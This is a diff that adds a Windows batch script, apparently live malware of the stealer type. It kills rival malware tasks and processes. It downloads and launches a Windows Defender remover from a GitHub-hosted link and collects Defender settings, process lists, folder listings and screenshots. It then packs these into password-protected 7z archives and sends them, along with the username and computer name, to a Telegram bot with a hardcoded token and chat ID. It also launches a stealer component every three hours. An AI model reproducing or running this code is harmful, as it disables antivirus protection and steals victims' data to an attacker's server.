+schtasks /end /tn "ComSurrogate"
+schtasks /end /tn "OneDrive Updater"
+schtasks /end /tn "OneDrive Task"
+schtasks /end /tn "Chromium Update"
+echo.
+echo.
+
+:: Removing Tasks
+echo Removing Tasks :
+schtasks /delete /tn "ComSurrogate" /f
+schtasks /delete /tn "OneDrive Updater" /f
+schtasks /delete /tn "OneDrive Task" /f
+schtasks /delete /tn "Chromium Update" /f
+schtasks /delete /TN "WinRNTMUpdate" /F
+schtasks /delete /TN "WinRTKUpdate" /F
+schtasks /delete /TN "checkCOMandadd" /F
+schtasks /delete /TN "SystemCertificates" /F
+echo.
+echo.
+
+
+
+:: Define tasks to check
+set "Task1=SystemLibrariesU"
+
+
+
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo Tasks : >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo %Task1% Installed and Enabled >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo Windows Defender : >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+powershell -Command "Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection'" >> "%InstalledQWB%"
+powershell -Command "Get-MpPreference | Out-String" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo All running processes >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+type "%ProcessTXTFILE%" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo List %ProgramData% files and folders >> "%InstalledQWB%"
+dir /b "%ProgramData%" > "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+
+
+
+
+
+
+
+
+
+
+
+:AFTERTASKSEVERY
+echo :AFTERTASKSEVERY
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:NEXT1
+echo :NEXT1
+echo.
+
+
+echo Stopping processes...
+taskkill /F /IM RuntimeBroker.exe
+taskkill /F /IM TSSPrxySTC.exe
+taskkill /F /IM TSSPrxyAdSTC.exe
+taskkill /F /IM RuntimeBroker.exe
+taskkill /F /IM StartupTaskCaller.exe
+
+
+echo Deleting files...
+del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
+del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
+del /F /Q "%SystemRoot%\System32\TSSPrxySTC.exe"
+del /F /Q "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
+del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
+del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
+del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
+del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
+del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+del /F /Q "%file6%"
+
+
+echo Operation completed.
+
+
+:: Check if HWID matches
+echo %VALID_HWIDS% | findstr /I /C:"%HWID%" >nul && goto HWIDMATCH
+
+echo HWID not authorized!
+goto NEXT6
+
+:HWIDMATCH
+echo HWID matched! Running program...
+echo.
+
+
+
+
+echo WinDefRemover Starting...
+echo.
+
+:WinDefRemover
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose WinDefRemover.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/WinDefRemoverFileLink') do set "WINDEFREMOVERFILELINK=%%i"
+echo %WINDEFREMOVERFILELINK%
+echo.
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto WinDefRemover
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.8MB (768000 bytes)
+if %FILESIZE% geq 768000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto WinDefRemover
+)
+
+
+set "MESSAGE=%MESSAGE%WinDefRemover^|"
+set "CheckSend=1"
+
+
+echo.
+echo WinDefRemover Started..
+timeout /t 20 /nobreak >nul
+echo Done.
+timeout /t 5 /nobreak >nul
+echo.
+echo.
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+:NEXT6
+
+::goto CONT
+
+
+
+
+
+
+
+
+
+
+
+
+
+:: Define the file to track the last run time
+set "LASTRUNFILE=%TEMP%\lastrun.log"
+
+:: Check if the file exists
+if not exist "%LASTRUNFILE%" (
+    echo 1 > "%LASTRUNFILE%"
+) else (
+    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
+    echo !MINUTESS! > "%LASTRUNFILE%"
+)
+
+:: Read the updated value
+set /p MINUTESS=<"%LASTRUNFILE%"
+echo Minutess=%MINUTESS%
+echo.
+echo.
+
+:: Check if 180 minutes have passed
+if %MINUTESS% GEQ 180 goto 3HOURDONE
+goto 3HOURSTILL
+
+:3HOURDONE
+start "" "%file1%"
+set "COMSTARTED=1"
+echo 0 > "%LASTRUNFILE%"
+goto NEXT4
+
+:3HOURSTILL
+echo.
+Minutes is still %MINUTESS%
+echo.
+
+
+
+
+
+
+
+
+:NEXT4
+
+
+
+:EVERYMINSEND
+echo :EVERYMINSEND
+echo.
+
+
+
+
+
+set "currentMinute=%time:~3,2%"
+:EVERY5MIN
+
+
+if "%currentMinute%"=="00" set "CheckSend=1"
+if "%currentMinute%"=="10" set "CheckSend=1"
+if "%currentMinute%"=="20" set "CheckSend=1"
+if "%currentMinute%"=="30" set "CheckSend=1"
+if "%currentMinute%"=="40" set "CheckSend=1"
+if "%currentMinute%"=="50" set "CheckSend=1"
+
+
+
+echo CheckSend=%CheckSend%
+
+
+
+
+
+
+:: ============ RUNNING TOPIC ============
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_RUNNING=-1002163721260"
+set "TOPIC_ID_RUNNING=73779"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%).....|%time%|(v%BATCHVERSION%)"
+set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
+set "CAPTION_RUNNING=This is a document for RUNNING Topic"
+set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
+
+
+
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_RUNNING%" ^
+     -d "message_thread_id=%TOPIC_ID_RUNNING%" ^
+     -d "text=%ENCODED_MESSAGE_RUNNING%"
+
+
+
+
+echo Message sent to chat ID %CHAT_ID_RUNNING% and TOPIC ID %TOPIC_ID_RUNNING%
+
+
+
+if "%COMSTARTED%"=="0" goto CONT
+
+
+
+:: ============ STLR TOPIC ============
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN_STLR=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_STLR=-1002163721260"
+set "TOPIC_ID_STLR=73727"
+set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLR.COMSTARTED..|%time%|(v%BATCHVERSION%)"
+set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"
+set "CAPTION_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)"
+set "FILE_PATH_STLR=%LOGFILE1%"
+
+
+
+
+echo Timeis=%time%
+echo.
+echo Sending"%ENCODED_MESSAGE_STLR%"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_STLR%" ^
+     -d "message_thread_id=%TOPIC_ID_STLR%" ^
+     -d "text=%ENCODED_MESSAGE_STLR%"
+
+
+
+
+
+
+:CONT
+echo :CONT
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CURRENTMINSET
+echo :CURRENTMINSET
+echo.
+
+set "currentMinute=%time:~3,2%"
+
+
+
+
+::echo.
+::echo.
+::echo.
+::echo CheckSend=%CheckSend%
+::echo Minutes=%currentMinute%
+::timeout /t 3 /nobreak
+
+
+
+
+
+
+:CHECKSENDING
+echo :CHECKSENDING
+echo.
+
+:: Check the value of CheckSend
+if "%CheckSend%"=="1" (
+    echo - CheckSend=%CheckSend% - Going to SENDGRANTED
+    goto SENDGRANTED
+) else (
+    echo - CheckSend=%CheckSend% - Going to checkloooop
+    goto NEXT2
+)
+
+
+
+
+
+
+
+
+
+
+
+
+:SENDGRANTED
+echo :SENDGRANTED
+echo.
+echo Making new log files
+echo.
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename4=!filename!"
+set "filename="
+set "TASKS_DATA=%temp%\!filename4!"
+
+
+
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename5=!filename!"
+set "filename="
+set "LOGFILE1=%temp%\!filename5!.mseuop"
+
+
+
+
+
+:: make a copy of %LOGFILE% to %LOGFILE1%
+type "%LOGFILE%" > "%LOGFILE1%"
+
+:: create %TASKS_DATA%
+schtasks /query /fo LIST /v > "%TASKS_DATA%"
+
+
+:: make x empty lines to %LOGFILE1% then type taask scheduler .....
+(for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
+type "%InstalledQWB%" >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+goto NEXT5
+
+
+echo Task Scheduler :  >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+type "%TASKS_DATA%" >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+
+
+:NEXT5
+
+
+echo Done. new log files
+echo Sending
+echo.
+echo.
+
+
+
+
+
+"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+
+
+if exist "%APPDATA%\microsoft\7z.exe" goto :COMPRESSFILES
+goto NEXT2
+
+
+
+:COMPRESSFILES
+echo 7z exists. Continue...
+echo.
+echo.
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename7=!filename!"
+set "filename="
+set "ZIP_FILE=%temp%\!filename7!.7z"
+echo ZIP_FILE="%ZIP_FILE%"
+echo.
+
+
+
+set "SVNzip_PATH=%APPDATA%\microsoft\7z.exe"
+set "Password=VProv7"
+set "File1=%USERPROFILE%\Downloads\screenshot.png"
+set "File2=%LOGFILE1%"
+
+
+echo Compressing Files
+"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
+if exist "%ZIP_FILE%" echo File Compressed successfuly.
+echo.
+echo.
+
+
+
+
+::goto PEROTY
+
+
+
+
+
+
+
+
+set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
+set "LOGSTLR=%temp%\LGSTLRR.ever"
+
+rem Delete existing ZIP file to ensure fresh compression
+if exist "%ZIP_FILEMS%" del /f /q "%ZIP_FILEMS%"
+echo Deleted.
+
+echo.
+echo.
+
+del /f /q "%LOGSTLR%"
+goto PEROTY
+type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
+echo. >> "%LOGSTLR%"
+echo. >> "%LOGSTLR%"
+echo 1 >> "%LOGSTLR%"
+
+
+
+
+rem Compress the files using 7-Zip
+"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILEMS%" "%LOGSTLR%"
+
+
+echo.
+echo.
+
+
+
+
+
+:PEROTY
+
+
+
+
+:: ============ Updates & SCRNSHTS TOPIC ============
+set "TOKEN_UPDATESSCRNSHTS=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_UPDATESSCRNSHTS=-1002163721260"
+set "TOPIC_ID_UPDATESSCRNSHTS=73936"
+set "MESSAGE_UPDATESSCRNSHTS=%USERNAME%(%COMPUTERNAME%) | RUNNING Topic Update | %time% | (v)"
+set "ENCODED_MESSAGE_UPDATESSCRNSHTS=%MESSAGE_RUNNING: =%%20"
+set "CAPTION_UPDATESSCRNSHTS=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
+set "FILE_PATH_UPDATESSCRNSHTS=%temp%\RUNNING_Topic.txt"
+
+
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
+     -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
+     -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
+     -F "document=@%ZIP_FILE%"
+
+goto PEROTY1
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
+     -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
+     -F "caption=mseuope" ^
+     -F "document=@%ZIP_FILEMS%"
+
+
+:PEROTY1
+
+
+
+
+
+echo Message sent to chat ID %CHAT_ID%
+echo Sent.
+
+
+
+
+
+:NEXT2
+set "currentMinute=%time:~3,2%"
+
+
+
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+del /f /q "%LOGFILE1%"
+del /f /q "%TASKS_DATA%"
+del /f /q "%ProcessTXTFILE%"
+del /f /q "%InstalledQWB%"
+del /f /q "%ZIP_FILE%"
+
+
+
+
+
+
+echo Going to :EOF
+goto :EOF
+
+:checkloooop
+
+
+
+
+set "currentSeconds=%time:~6,2%"
+if %currentSeconds% geq 40 (
+    echo Seconds are 40 or greater. Exiting...
+    goto :EOF
+)
+
+cls
+echo Looping... (%currentSeconds%)
+::timeout /t 1 /nobreak
+goto :loop_start
+
+
+
+
+goto :EOF
+
+
+:: Commands to skip ( maybe i need later ) 
+::  if i want to kill child process of X.exe ( firstly i must to make X.exe use another file in all the script ( for example logging all the batch into file ) 
+:: so i have to use handle.exe to check this file is locked by any processes , this processes is the child one , so this commands will kill this processes excluding handle.exe if found
+
+
+
+:: Define the file to check
+set "FILEUSEDBYPROCESS=%temp%\LOOOOOG.txt"
+
+:: Get the list of processes locking the file
+for /f "tokens=1,3" %%A in ('handle.exe "%FILEUSEDBYPROCESS%" ^| findstr /r "[0-9]*:"') do (
+    set "PROCESS_NAME=%%A"
+    set "PID=%%B"
+    
+    if /I not "!PROCESS_NAME!"=="handle.exe" (
+        echo Killing process with name "!PROCESS_NAME!" and PID: !PID!
+        taskkill /F /PID !PID!
+    ) else (
+        echo Skipping handle.exe (PID: !PID!)
+    )
+)
+
+
+:: Another method using powershell ! 
+
+:: List child processes of file1.exe (converted batch file)
+echo Listing child processes of file1.exe...
+powershell -Command "Get-WmiObject Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process Test).Id } | Select-Object ProcessId, Name" > chldrocess.txt
+
+:: Display the child processes
+echo.
+echo PID   -   Process Name
+echo ----------------------
+for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
+    set "PID=%%A"
+    set "PROCESSNAME=%%B"
+    echo !PID!   -   !PROCESSNAME!
+)
+echo.
+echo.
+echo.
+:: Kill all child processes using taskkill
+for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
+    set "PID=%%A"
+    set "PROCESSNAME=%%B"
+    echo Killing !PROCESSNAME! with PID !PID!
+    taskkill /PID !PID! /F
+)
+echo.
+echo.
+:: Cleanup
+del chldrocess.txt
+echo.
+echo All child processes terminated.
+
